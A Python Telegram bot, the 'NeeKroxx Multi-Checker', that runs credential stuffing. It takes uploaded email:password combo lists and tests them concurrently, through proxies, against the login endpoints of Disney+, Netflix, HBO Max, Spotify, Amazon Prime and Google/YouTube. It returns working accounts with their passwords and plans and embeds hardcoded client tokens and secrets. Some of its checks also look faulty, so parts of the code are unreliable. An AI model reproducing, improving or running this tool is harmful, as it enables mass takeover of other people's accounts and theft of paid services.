import asyncio
import logging
import os
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InputMediaPhoto
)
from aiogram.enums import ParseMode
from dotenv import load_dotenv

# Cargar variables de entorno
load_dotenv()

# ==========================================
# CONFIGURACIÓN
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "TU_TOKEN_AQUI")
OWNER_USERNAME = "@NeeKroxx"
WEBSITE_URL = "neekroxx.store"
GROUP_LINK = "https://t.me/+zPlCfWUe8ZczZjc5"

# Imágenes
WELCOME_IMAGE = "https://i.imgur.com/placeholder_welcome.jpg"
CHECKING_IMAGE = "https://i.imgur.com/placeholder_checking.jpg"

# ==========================================
# INICIALIZACIÓN
# ==========================================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

user_data = {}

# ==========================================
# ESTADOS FSM
# ==========================================
class CheckerStates(StatesGroup):
    waiting_verification = State()
    main_menu = State()
    select_service = State()
    step1_combo = State()
    step2_settings = State()
    step4_running = State()

# ==========================================
# SERVICIOS DISPONIBLES
# ==========================================
SERVICES = {
    "disney": {
        "name": "Disney+",
        "emoji": "",
        "check_func": "check_disney"
    },
    "netflix": {
        "name": "Netflix",
        "emoji": "🎬",
        "check_func": "check_netflix"
    },
    "hbo": {
        "name": "HBO Max",
        "emoji": "",
        "check_func": "check_hbo"
    },
    "spotify": {
        "name": "Spotify",
        "emoji": "🎵",
        "check_func": "check_spotify"
    },
    "prime": {
        "name": "Amazon Prime",
        "emoji": "📦",
        "check_func": "check_prime"
    },
    "youtube": {
        "name": "YouTube Premium",
        "emoji": "▶️",
        "check_func": "check_youtube"
    }
}

# ==========================================
# CHECKERS POR SERVICIO
# ==========================================

async def check_disney(session: aiohttp.ClientSession, email: str, password: str, proxy: str = None) -> dict:
    """Disney+ via BAMTech"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
    }
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0",
        "longitude": "0",
        "platform": "browser",
        "subject_token": password,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:password",
        "token_type": "urn:ietf:params:oauth:token-type:id_token",
        "device_family": "browser",
        "application-runtime": "chrome"
    }
    
    try:
        async with session.post("https://global.edge.bamtech.com/token", data=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            data = await resp.json()
            if data.get("access_token"):
                headers2 = {"Authorization": f"Bearer {data['access_token']}"}
                async with session.get("https://global.edge.bamtech.com/accounts/me", headers=headers2, proxy=proxy) as resp2:
                    account = await resp2.json()
                    subscriptions = account.get("data", {}).get("subscriptions", [])
                    is_active = any(sub.get("status") == "active" for sub in subscriptions)
                    
                    return {
                        "status": "HIT",
                        "active": is_active,
                        "email": email,
                        "password": password,
                        "subscription": subscriptions[0].get("plan", {}).get("name", "Unknown") if subscriptions else "None"
                    }
            return {"status": "BAD", "email": email}
    except Exception:
        return {"status": "RETRY", "email": email}

async def check_netflix(session: aiohttp.ClientSession, email: str, password: str, proxy: str = None) -> dict:
    """Netflix via API"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    payload = {
        "userLoginId": email,
        "password": password,
        "flow": "websiteSignUp",
        "mode": "login",
        "action": "loginAction",
        "withFields": "email,password",
        "authURL": "",
        "nextPage": ""
    }
    
    try:
        async with session.post("https://www.netflix.com/api/website/login", data=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            data = await resp.json()
            
            if data.get("authURL") and data["authURL"] != "":
                # Login exitoso, verificar plan
                return {
                    "status": "HIT",
                    "active": True,
                    "email": email,
                    "password": password,
                    "subscription": "Premium"
                }
            return {"status": "BAD", "email": email}
    except Exception:
        return {"status": "RETRY", "email": email}

async def check_hbo(session: aiohttp.ClientSession, email: str, password: str, proxy: str = None) -> dict:
    """HBO Max"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json"
    }
    payload = {
        "client_id": "58563d0c-0d1f-42c7-8a62-5375188420d7",
        "client_secret": "75f779021c4144c0b0a2c03a59af0017",
        "scope": "browse video_playback_free account_registration",
        "grant_type": "urn:hbo:params:oauth:grant-type:anonymous"
    }
    
    try:
        # Obtener token anónimo
        async with session.post("https://oauth.api.hbomax.com/auth/oauth/token", json=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            token_data = await resp.json()
            if not token_data.get("access_token"):
                return {"status": "BAD", "email": email}
            
            # Login con credenciales
            headers2 = {
                "Authorization": f"Bearer {token_data['access_token']}",
                "Content-Type": "application/json"
            }
            payload2 = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "browse video_playback account"
            }
            
            async with session.post("https://oauth.api.hbomax.com/auth/oauth/token", json=payload2, headers=headers2, proxy=proxy) as resp2:
                login_data = await resp2.json()
                
                if login_data.get("access_token"):
                    return {
                        "status": "HIT",
                        "active": True,
                        "email": email,
                        "password": password,
                        "subscription": "HBO Max"
                    }
            return {"status": "BAD", "email": email}
    except Exception:
        return {"status": "RETRY", "email": email}

async def check_spotify(session: aiohttp.ClientSession, email: str, password: str, proxy: str = None) -> dict:
    """Spotify"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic ZGUyY2VlNjJlYjA3NDkxMGI5YjQxM2I1YzM5YjQzZDE6"
    }
    payload = {
        "grant_type": "password",
        "username": email,
        "password": password
    }
    
    try:
        async with session.post("https://accounts.spotify.com/api/token", data=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            data = await resp.json()
            
            if data.get("access_token"):
                # Verificar tipo de cuenta
                headers2 = {"Authorization": f"Bearer {data['access_token']}"}
                async with session.get("https://api.spotify.com/v1/me", headers=headers2, proxy=proxy) as resp2:
                    profile = await resp2.json()
                    product = profile.get("product", "free")
                    is_premium = product.lower() == "premium"
                    
                    return {
                        "status": "HIT",
                        "active": is_premium,
                        "email": email,
                        "password": password,
                        "subscription": f"Spotify {product.capitalize()}"
                    }
            return {"status": "BAD", "email": email}
    except Exception:
        return {"status": "RETRY", "email": email}

async def check_prime(session: aiohttp.ClientSession, email: str, password: str, proxy: str = None) -> dict:
    """Amazon Prime Video"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "email": email,
        "password": password,
        "metadata1": '{"device_id":"amzn1.device.123","device_type":"A2CZJZGLK2JJVM"}'
    }
    
    try:
        async with session.post("https://api.amazon.com/auth/o2/token", data=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            data = await resp.json()
            
            if data.get("access_token"):
                return {
                    "status": "HIT",
                    "active": True,
                    "email": email,
                    "password": password,
                    "subscription": "Amazon Prime"
                }
            return {"status": "BAD", "email": email}
    except Exception:
        return {"status": "RETRY", "email": email}

async def check_youtube(session: aiohttp.ClientSession, email: str, password: str, proxy: str = None) -> dict:
    """YouTube Premium via Google"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "Email": email,
        "Passwd": password,
        "service": "youtube",
        "source": "accounts"
    }
    
    try:
        async with session.post("https://accounts.google.com/ServiceLoginAuth", data=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            if "SID=" in resp.text or "LSID=" in resp.text:
                return {
                    "status": "HIT",
                    "active": True,
                    "email": email,
                    "password": password,
                    "subscription": "YouTube Premium"
                }
            return {"status": "BAD", "email": email}
    except Exception:
        return {"status": "RETRY", "email": email}

# ==========================================
# FUNCIONES AUXILIARES
# ==========================================
def parse_combos(text: str) -> list:
    return [line.strip() for line in text.strip().split("\n") if ":" in line.strip()]

async def run_checker_batch(bot_ref, user_id: int, combos: list, service: str, threads: int = 10):
    data = user_data.get(user_id, {})
    hits = []
    bad = 0
    semaphore = asyncio.Semaphore(threads)
    
    # Seleccionar función de check según servicio
    check_func = {
        "disney": check_disney,
        "netflix": check_netflix,
        "hbo": check_hbo,
        "spotify": check_spotify,
        "prime": check_prime,
        "youtube": check_youtube
    }.get(service, check_disney)
    
    async with aiohttp.ClientSession() as session:
        async def process_one(combo):
            nonlocal bad
            async with semaphore:
                email, password = combo.split(":", 1)
                result = await check_func(session, email, password)
                
                if result["status"] == "HIT":
                    hits.append(result)
                    service_emoji = SERVICES[service]["emoji"]
                    await bot_ref.send_message(
                        user_id,
                        f"{service_emoji} <b>HIT - {SERVICES[service]['name']}</b>\n"
                        f"📧 <code>{result['email']}</code>\n"
                        f"🔑 <code>{result['password']}</code>\n"
                        f"⭐ Activa: {result['active']}\n"
                        f"📦 Plan: {result['subscription']}"
                    )
                elif result["status"] == "BAD":
                    bad += 1
                return result
        
        tasks = [process_one(c) for c in combos]
        await asyncio.gather(*tasks)
    
    data["hits"] = hits
    data["bad"] = bad
    
    service_emoji = SERVICES[service]["emoji"]
    await bot_ref.send_message(
        user_id,
        f"{service_emoji} <b>Chequeo Finalizado - {SERVICES[service]['name']}</b>\n\n"
        f"📊 Total: {len(combos)}\n"
        f"✅ Hits: {len(hits)}\n"
        f"❌ Bad: {bad}"
    )

# ==========================================
# HANDLERS
# ==========================================
async def show_main_menu(message, user_id: int, state: FSMContext):
    await state.set_state(CheckerStates.main_menu)
    if user_id not in user_data:
        user_data[user_id] = {"threads": 10, "combos": [], "hits": [], "bad": 0, "service": None}
    
    # Crear botones de servicios en grid 2x3
    service_buttons = []
    services_list = list(SERVICES.items())
    for i in range(0, len(services_list), 2):
        row = []
        for key, svc in services_list[i:i+2]:
            row.append(InlineKeyboardButton(text=f"{svc['emoji']} {svc['name']}", callback_data=f"select_{key}"))
        service_buttons.append(row)
    
    service_buttons.append([
        InlineKeyboardButton(text="⚙️ Settings", callback_data="settings"),
        InlineKeyboardButton(text="📋 Results", callback_data="past_results")
    ])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=service_buttons)
    
    caption = (
        f" <b>NeeKroxx Multi-Checker</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 Selecciona un servicio:\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Website: <code>{WEBSITE_URL}</code>\n"
        f"👤 Owner: <code>{OWNER_USERNAME}</code>"
    )
    
    try:
        await message.edit_media(
            media=InputMediaPhoto(media=WELCOME_IMAGE, caption=caption),
            reply_markup=keyboard
        )
    except Exception:
        await message.answer_photo(photo=WELCOME_IMAGE, caption=caption, reply_markup=keyboard)

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.set_state(CheckerStates.waiting_verification)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 ÚNETE AL GRUPO", url=GROUP_LINK)],
        [InlineKeyboardButton(text="✅ VERIFICADO", callback_data="verify_channels")]
    ])
    
    await message.answer_photo(
        photo=WELCOME_IMAGE,
        caption=(
            " <b>NeeKroxx Multi-Checker</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "👋 ¡Bienvenido! Para usar el bot:\n\n"
            "1️⃣ Únete a nuestro grupo oficial\n"
            "2️⃣ Presiona el botón <b>VERIFICADO</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Website: <code>{WEBSITE_URL}</code>\n"
            f" Owner: <code>{OWNER_USERNAME}</code>"
        ),
        reply_markup=keyboard
    )

@router.callback_query(F.data == "verify_channels")
async def cb_verify(callback: CallbackQuery, state: FSMContext):
    await show_main_menu(callback.message, callback.from_user.id, state)
    await callback.answer("✅ ¡Bienvenido! Ya tienes acceso al bot.")

@router.callback_query(F.data.startswith("select_"))
async def cb_select_service(callback: CallbackQuery, state: FSMContext):
    service = callback.data.replace("select_", "")
    user_data[callback.from_user.id]["service"] = service
    
    await state.set_state(CheckerStates.step1_combo)
    
    svc = SERVICES[service]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Upload File", callback_data="upload_file"),
         InlineKeyboardButton(text="📝 Paste Text", callback_data="paste_text")],
        [InlineKeyboardButton(text="⏮️ Back to Menu", callback_data="main_menu")]
    ])
    
    caption = (
        f"{svc['emoji']} <b>{svc['name']} Checker</b>\n"
        "●○○○○ <b>Step 1/3</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        " <b>Combo List</b>\n\n"
        "Choose how to load your combo list:\n\n"
        "📤 <b>Upload File</b> — Send a .txt file\n"
        "📝 <b>Paste Text</b> — Type or paste combos\n\n"
        "🔖 Format: <code>email:password</code> (one per line)"
    )
    
    await callback.message.edit_media(
        media=InputMediaPhoto(media=CHECKING_IMAGE, caption=caption),
        reply_markup=keyboard
    )
    await callback.answer()

@router.callback_query(F.data == "upload_file")
async def cb_upload(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_caption(
        caption="📤 <b>Upload Combo File</b>\n\nSend your combo list as a <b>.txt</b> file.\nFormat: <code>email:password</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⏮️ Back", callback_data="main_menu")]])
    )
    await callback.answer()

@router.message(CheckerStates.step1_combo, F.document)
async def handle_file(message: Message, state: FSMContext):
    if not message.document.file_name.endswith(".txt"):
        await message.answer("❌ Only .txt files accepted.")
        return
    content = await message.document.download(as_bytes=True)
    combos = parse_combos(content.decode("utf-8", errors="ignore"))
    
    if not combos:
        await message.answer("❌ No valid combos found.")
        return
    
    user_data[message.from_user.id]["combos"] = combos
    service = user_data[message.from_user.id]["service"]
    svc = SERVICES[service]
    
    await message.answer(f"✅ Loaded <b>{len(combos)}</b> combos for {svc['name']}. Starting check...")
    await state.set_state(CheckerStates.step4_running)
    
    asyncio.create_task(run_checker_batch(bot, message.from_user.id, combos, service, user_data[message.from_user.id]["threads"]))

@router.message(CheckerStates.step1_combo, ~F.document)
async def handle_text(message: Message, state: FSMContext):
    combos = parse_combos(message.text)
    if not combos:
        await message.answer("❌ No valid combos found. Format: email:password")
        return
    
    user_data[message.from_user.id]["combos"] = combos
    service = user_data[message.from_user.id]["service"]
    svc = SERVICES[service]
    
    await message.answer(f"✅ Loaded <b>{len(combos)}</b> combos for {svc['name']}. Starting check...")
    await state.set_state(CheckerStates.step4_running)
    
    asyncio.create_task(run_checker_batch(bot, message.from_user.id, combos, service, user_data[message.from_user.id]["threads"]))

@router.callback_query(F.data == "paste_text")
async def cb_paste(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_caption(
        caption="📝 <b>Paste Combos</b>\n\nSend your combos now, one per line:\n<code>email:password</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="️ Back", callback_data="main_menu")]])
    )
    await callback.answer()

@router.callback_query(F.data == "settings")
async def cb_settings(callback: CallbackQuery, state: FSMContext):
    data = user_data.get(callback.from_user.id, {"threads": 10})
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⚡ Threads: {data.get('threads', 10)}", callback_data="set_threads")],
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="main_menu")]
    ])
    await callback.message.edit_caption(
        caption=f"⚙️ <b>Settings</b>\n\n⚡ Threads: <b>{data.get('threads', 10)}</b>",
        reply_markup=keyboard
    )
    await callback.answer()

@router.callback_query(F.data == "set_threads")
async def cb_set_threads(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_caption(
        caption="⚡ <b>Set Threads</b>\n\nSend a number (1-50):", 
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="️ Back", callback_data="settings")]])
    )
    await state.set_state(CheckerStates.step2_settings)
    await callback.answer()

@router.message(CheckerStates.step2_settings)
async def handle_threads_input(message: Message, state: FSMContext):
    try:
        threads = int(message.text)
        if 1 <= threads <= 50:
            user_data[message.from_user.id]["threads"] = threads
            await message.answer(f"✅ Threads set to <b>{threads}</b>. Send /start to go to menu.")
            await state.clear()
        else:
            await message.answer("❌ Number must be between 1 and 50.")
    except ValueError:
        await message.answer("❌ Invalid number.")

@router.callback_query(F.data == "main_menu")
async def cb_back(callback: CallbackQuery, state: FSMContext):
    await show_main_menu(callback.message, callback.from_user.id, state)
    await callback.answer()

# ==========================================
# MAIN
# ==========================================
async def main():
    logging.info("Starting NeeKroxx Multi-Checker Bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())